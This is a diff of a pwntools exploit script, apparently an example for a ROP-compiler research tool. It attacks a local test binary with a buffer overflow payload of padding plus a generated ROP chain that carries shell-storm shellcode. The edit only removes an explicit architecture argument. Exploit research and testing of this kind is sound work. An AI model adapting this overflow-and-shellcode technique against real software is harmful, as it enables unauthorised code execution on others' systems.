@@ -1,9 +1,8 @@
 import sys, logging, binascii
-import archinfo
 from pwn import *
 from rop_compiler import ropme, goal
 
-filename, arch = './bof_read_got_x86', archinfo.ArchX86()
+filename = './bof_read_got_x86'
 p = process([filename,'3000'])
 #gdb.attach(p, "set disassembly-flavor intel\nbreak *0x0804856a\n")
 
@@ -23,7 +22,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-827.php
 
 files = [(filename, None, None)]
 libs = ['/lib/i386-linux-gnu/libc.so.6']
-rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], arch = arch, log_level = logging.DEBUG)
+rop = ropme.rop(files, libs, [["shellcode_hex", binascii.hexlify(shellcode)]], log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*16 + rop
 
